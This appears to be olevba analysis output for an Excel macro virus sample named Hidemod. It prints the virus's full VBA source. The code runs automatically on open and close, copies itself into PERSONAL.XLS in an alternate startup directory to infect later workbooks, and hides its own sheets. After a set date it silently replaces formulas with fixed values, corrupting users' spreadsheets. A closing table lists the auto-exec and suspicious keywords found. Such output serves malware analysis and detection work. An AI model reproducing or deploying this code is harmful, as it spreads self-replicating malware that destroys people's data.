olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Hidemod-4d2b8ed648e69c5b6d3a9e4d8486080308edfb88
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ModulV101.bas 
in file: Virus.MSExcel.Hidemod-4d2b8ed648e69c5b6d3a9e4d8486080308edfb88 - OLE stream: '_VBA_PROJECT_CUR/VBA/ModulV101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




































































































Option Explicit
Private Const NameSheetV101 As String = "SheetV101"
Private Const NameModulV101 As String = "ModulV101"
Private Const DateV101 As String = "SheetV101!$A$33"
Private Const PeriodDate As Date = 60
'==========================
Sub Auto_open()
Attribute Auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Pz As Boolean
'   Exit Sub      '???????????????????????????

  Application.ScreenUpdating = False
On Error GoTo M
  Pz = CheckPers
  ThisWorkbook.OnSheetActivate = "HideModV101"
  If Range(DateV101).Value > Date Then GoTo M
  ThisWorkbook.OnCalculate = "ChangeCell"
M:
  Application.ScreenUpdating = True
End Sub

'==========================
Sub Auto_close()
Attribute Auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
Dim x, y As Integer

'   Exit Sub      '???????????????????????????
  
  Application.ScreenUpdating = False
On Error GoTo M
  If Range(DateV101).Value > Date Then Exit Sub
   x = Cells.SpecialCells(xlLastCell).Row
   y = Cells.SpecialCells(xlLastCell).Column
   Range(Cells(1, 1), Cells(x, y)).Copy
   Range(Cells(1, 1), Cells(x, y)).PasteSpecial Paste:=xlValues
   ThisWorkbook.Save
M:
  Application.ScreenUpdating = True
End Sub
'==========================
Sub ChangeCell()
Attribute ChangeCell.VB_ProcData.VB_Invoke_Func = " \n14"
  If Rnd < 0.7 Then Exit Sub
On Error GoTo M
  Selection.Copy
  Selection.PasteSpecial Paste:=xlValues
  Application.CutCopyMode = False
M:
End Sub
'===================
Private Function CheckPers() As Boolean
Dim x As Integer
Dim Pz As Boolean

On Error GoTo M
  If ActiveWorkbook.Name = "PERSONAL.XLS" Then
    Application.OnWindow = "CheckV101"
    ActiveWindow.Visible = Not HideV101
    CheckPers = True
    Exit Function
  End If
  For x = 1 To Application.Workbooks.Count
    If Application.Workbooks(x).Name = "PERSONAL.XLS" Then
      Pz = True
      Exit For
    End If
  Next x
  If Not Pz Then CreatePers
  CheckPers = Pz
  Exit Function
M:
  Resume Next
End Function
'==========
Private Function MMDir(ByVal NameDir As String) As Boolean
  On Error GoTo M1
    MkDir NameDir
    MMDir = True
  Exit Function
M1:
    MMDir = False
End Function
'=====================
Private Function MakeMyDir(ByVal NameDir As String) As Boolean
  On Error GoTo M
    ChDir NameDir
    MakeMyDir = True
    Exit Function
M:
  If MMDir(NameDir) Then
    MakeMyDir = True
  Else
    MakeMyDir = False
  End If
End Function
'===========================
Private Function FindDir(ByVal NameDir As String) As String
Dim Ms As String

  Ms = NameDir
M:
  If MakeMyDir(Ms) Then
    FindDir = Ms
    Exit Function
  End If
  Select Case Ms
   Case "c:\Windows\AltStart" '---------------------
    Ms = "c:\Win95\AltStart"
   Case "c:\Win95\AltStart" '---------------------
    Ms = "d:\Windows\AltStart"
   Case "d:\Windows\AltStart" '---------------------
    Ms = "d:\Win95\AltStart"
   Case "d:\Win95\AltStart" '---------------------
    Ms = "c:\AltStart"
   Case Else '---------------------
    Ms = "c:\Windows\AltStart"
  End Select
GoTo M
End Function
'=========================
Private Function FindPers(ByVal NPath As String) As Boolean
Dim MPN As String

  MPN = Trim(NPath)
  If MPN = "" Then
    FindPers = False
    Exit Function
  End If
  
  MPN = Trim(MPN) + "\PERSONAL.XLS"
On Error GoTo M
  Date = FileDateTime(MPN)
  FindPers = True
  Exit Function
M:
  If Err = 53 Then
    FindPers = False
  End If
End Function
'===================
Sub CreatePers()
Attribute CreatePers.VB_ProcData.VB_Invoke_Func = " \n14"
  Dim BookNameOld, BookNameNew As String
  Dim MPathName, MPN As String
  Dim Pz As Boolean
    BookNameOld = ActiveWorkbook.Name
    MPathName = FindDir(Application.AltStartupPath)
    MPN = Trim(MPathName) + "\PERSONAL.XLS"
    If FindPers(MPathName) Then
      Application.AltStartupPath = MPathName
      Workbooks.Open Filename:=MPN
      Exit Sub
    End If
    Workbooks.Add
    BookNameNew = ActiveWorkbook.Name
      Workbooks(BookNameOld).Sheets(NameModulV101).Visible = True
      Workbooks(BookNameOld).Sheets(NameSheetV101).Visible = True
    Workbooks(BookNameOld).Sheets(Array(NameSheetV101, NameModulV101)).Copy _
          Before:=ActiveWorkbook.Sheets(1)
      Workbooks(BookNameOld).Sheets(NameModulV101).Visible = False
      Workbooks(BookNameOld).Sheets(NameSheetV101).Visible = False
    Range(DateV101).Value = Date + PeriodDate
    Workbooks(BookNameNew).OnSheetActivate = BookNameNew & "!HideModV101"
    Application.OnWindow = BookNameNew & "!CheckV101"
    ActiveWindow.Visible = Not HideV101
On Error GoTo M
    Workbooks(BookNameNew).SaveAs Filename:=MPN, _
        FileFormat:=xlNormal, Password:="", WriteResPassword:="", _
        ReadOnlyRecommended:=False, CreateBackup:=False
    Application.AltStartupPath = MPathName
Exit Sub
M:
  MPathName = FindDir(MPathName)
  MPN = Trim(MPathName) + "\PERSONAL.XLS"
  If Not FindPers(MPathName) Then
    Resume
  Else
    Resume Next
  End If
End Sub
'===============================
Sub CheckV101()
Attribute CheckV101.VB_ProcData.VB_Invoke_Func = " \n14"
Dim x As Integer
Dim PzM, PzD As Boolean
  Application.ScreenUpdating = False
On Error GoTo M
  PzM = False
  PzD = False
  For x = 1 To ActiveWorkbook.Sheets.Count
    If ActiveWorkbook.Sheets(x).Name = NameModulV101 Then PzM = True
    If ActiveWorkbook.Sheets(x).Name = NameSheetV101 Then PzD = True
    If PzD And PzM Then
      Application.ScreenUpdating = HideV101
      Exit Sub
    End If
  Next x
  If Not PzD Then
    Workbooks("PERSONAL.XLS").Sheets(NameSheetV101).Visible = True
    Workbooks("PERSONAL.XLS").Sheets(NameSheetV101).Copy _
         Before:=ActiveWorkbook.Sheets(1)
    'Range(DateV101).Value = Date + PeriodDate
    Workbooks("PERSONAL.XLS").Sheets(NameSheetV101).Visible = False
  End If
  If Not PzM Then
    Workbooks("PERSONAL.XLS").Sheets(NameModulV101).Visible = True
    Workbooks("PERSONAL.XLS").Sheets(NameModulV101).Copy _
         Before:=ActiveWorkbook.Sheets(1)
    Workbooks("PERSONAL.XLS").Sheets(NameModulV101).Visible = False
  End If
  ActiveWorkbook.OnSheetActivate = ActiveWorkbook.Name & "!HideModV101"
  Workbooks("PERSONAL.XLS").Save
M1:
  Application.ScreenUpdating = HideV101
  Exit Sub
M:
  x = Err
  Resume M1
End Sub
'===============================
Private Function HideV101() As Boolean
 On Error GoTo M
    ActiveWorkbook.Sheets(NameSheetV101).Visible = False
    ActiveWorkbook.Modules(NameModulV101).Visible = False
    HideV101 = True
    Exit Function
M:
  Resume Next
End Function
'==================
Sub HideModV101()
Attribute HideModV101.VB_ProcData.VB_Invoke_Func = " \n14"
 Dim x As Integer
  If ActiveSheet.Name = NameSheetV101 Or _
     ActiveSheet.Name = NameModulV101 Then
     ActiveSheet.Visible = False
     For x = 1 To ActiveWorkbook.Sheets.Count
       If Sheets(x).Name <> NameSheetV101 And _
          Sheets(x).Name <> NameModulV101 Then
         Sheets(x).Select
         Exit Sub
       End If
     Next x
  End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  ModulV10
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  SheetV10
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Application.AltStart|May change which directory contains files to |
|          |upPath              |open at startup                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

